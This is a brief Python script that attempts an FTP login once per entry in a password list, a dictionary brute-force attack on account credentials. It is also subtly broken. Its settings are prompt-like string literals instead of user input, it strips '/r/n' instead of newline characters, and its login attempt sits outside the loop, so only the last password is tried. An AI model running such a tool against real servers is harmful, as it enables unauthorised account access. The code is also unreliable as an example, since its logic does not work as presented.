#!/usr/bin/python3

import ftplib

server = ("FTP Server: ")

user =("username: ")

Passwordlist = ("Path to Password List >/mycode/passwords.txt")

try:
    
    with open(Passwordlist, 'r') as pw:

        for word in pw:

            word = word.strip('/r/n')

        try:
            
            ftp = ftplib.FTP(server)

            ftp.login(user, word)

            print ('Success! The password is ' + word)

        except ftplib.error_perm as exc:

            print('stil trying...', exc)

except Exception as exc:

    print ('Wordlist error: ', exc)    


